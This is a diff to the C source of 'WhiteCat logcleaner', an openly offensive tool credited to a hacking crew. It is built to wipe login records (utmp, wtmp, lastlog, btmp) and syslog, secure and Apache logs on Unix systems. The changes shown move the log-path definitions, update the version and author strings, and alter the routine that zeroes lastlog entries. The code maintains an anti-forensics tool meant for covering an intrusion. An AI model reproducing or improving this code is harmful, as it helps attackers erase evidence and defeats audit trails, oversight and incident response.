@@ -32,7 +32,7 @@
  * Revision History:
  *
  * Unknown Year - Pashkela - add apache log files
- * Jan. 2024 - Hui Li - reformat, rewrite xgethostname, compile_pattern
+ * Jul. 2024 - Hui Li - refactor, rewrite xgethostname, compile_pattern
  *                      functions and other bug fixes
  */ 
 #include <stdio.h>
@@ -55,6 +55,61 @@
 #include <utmpx.h>
 #include <lastlog.h>
 #endif 
+
+/* SOLARIS */
+#ifdef SUNOS
+ #ifndef LASTLOG_FILE
+   #define LASTLOG_FILE "/var/adm/lastlog"
+ #endif
+ #ifndef BTMPX_FILE
+   #define BTMPX_FILE "/var/adm/btmpx"
+ #endif
+#else
+
+/* Linux, FreeBSD */
+ #ifndef UTMP_FILE
+   #ifndef _PATH_UTMP
+     #define UTMP_FILE "/var/run/utmp"
+   #else
+     #define UTMP_FILE _PATH_UTMP
+   #endif
+#endif
+#ifndef WTMP_FILE
+  #ifndef _PATH_WTMP
+    #define WTMP_FILE "/var/log/wtmp"
+  #else
+    #define WTMP_FILE _PATH_WTMP
+  #endif
+#endif
+#ifndef LASTLOG_FILE
+ #ifndef _PATH_LASTLOG
+   #define LASTLOG_FILE "/var/log/lastlog"
+ #else
+   #define LASTLOG_FILE _PATH_LASTLOG
+ #endif
+#endif
+#ifndef BTMP_FILE
+  #ifndef _PATH_BTMP
+    #define BTMP_FILE "/var/log/btmp"
+  #else
+    #define BTMP_FILE _PATH_BTMP
+  #endif
+#endif
+#endif
+
+//modify parametrs as in your box ;)
+#ifdef SUNOS
+  #define SYSLOG_FILE "/var/log/syslog"
+#else
+  #define SYSLOG_FILE "/var/log/messages"
+#endif
+
+#define SECURE_FILE "/var/log/secure"
+#define MAXBUFF 8 * 1024
+#define PROGRAM_NAME "WhiteCat logcleaner"
+#define PROGRAM_VERSION 2.0
+#define PROGRAM_RELEASE 0
+#define AUTHORS "\n\t Shad0S [Hell Knights Crew]\n\t [Pashkela edition for rdot.org]\n\t [Hui Li]"
 
 /* APACHE access & error logs paths*/
 char *APACHE_PATH[]=
@@ -112,61 +167,6 @@ char *APACHE_PATH[]=
     "/var/log/error_log",
     "/var/log/error.log"
 };
-
-/* SOLARIS */
-#ifdef SUNOS
- #ifndef LASTLOG_FILE
-   #define LASTLOG_FILE "/var/adm/lastlog"
- #endif
- #ifndef BTMPX_FILE
-   #define BTMPX_FILE "/var/adm/btmpx"
- #endif
-#else
-
-/* Linux, FreeBSD */
- #ifndef UTMP_FILE
-   #ifndef _PATH_UTMP
-     #define UTMP_FILE "/var/run/utmp"
-   #else
-     #define UTMP_FILE _PATH_UTMP
-   #endif
-#endif
-#ifndef WTMP_FILE
-  #ifndef _PATH_WTMP
-    #define WTMP_FILE "/var/log/wtmp"
-  #else
-    #define WTMP_FILE _PATH_WTMP
-  #endif
-#endif
-#ifndef LASTLOG_FILE
- #ifndef _PATH_LASTLOG
-   #define LASTLOG_FILE "/var/log/lastlog"
- #else
-   #define LASTLOG_FILE _PATH_LASTLOG
- #endif
-#endif
-#ifndef BTMP_FILE
-  #ifndef _PATH_BTMP
-    #define BTMP_FILE "/var/log/btmp"
-  #else
-    #define BTMP_FILE _PATH_BTMP
-  #endif
-#endif
-#endif
-
-//modify parametrs as in your box ;)
-#ifdef SUNOS
-  #define SYSLOG_FILE "/var/log/syslog"
-#else
-  #define SYSLOG_FILE "/var/log/messages"
-#endif
-
-#define SECURE_FILE "/var/log/secure"
-#define MAXBUFF 8 * 1024
-#define PROGRAM_NAME "WhiteCat logcleaner"
-#define PROGRAM_VERSION 1.1
-#define PROGRAM_RELEASE 1
-#define AUTHORS "Shad0S [Hell Knights Crew]"
 
 typedef struct {
     regex_t regex_pattern;
@@ -598,7 +598,7 @@ static int clear_lastlog (char *filename) {
         }
         if (found) {
             //XXX is this correct?
-            bzero(&entry, sizeof(struct lastlog));
+            memset(&entry, '\0', sizeof(struct lastlog));
             found = 0;
         }
         if (lseek(fd, -(off_t)rcnt, SEEK_CUR) == (off_t)-1) {
@@ -737,7 +737,7 @@ static void usage(void) {
 /* print version information */
 static void version(void) {
     fprintf(stdout, "\t ==========================================================================================================\n"); 
-    fprintf(stdout, "\t = \033[1m%s %1.1f.%d by %s, 2024.\033[0m =\n", 
-        PROGRAM_NAME, PROGRAM_VERSION, PROGRAM_RELEASE, AUTHORS "[Pashkela edition for rdot.org] [Hui Li]");
+    fprintf(stdout, "\t \033[1m%s %1.1f.%d by %s\033[0m\n", 
+        PROGRAM_NAME, PROGRAM_VERSION, PROGRAM_RELEASE, AUTHORS);
     fprintf(stdout, "\t ==========================================================================================================\n"); 
 }
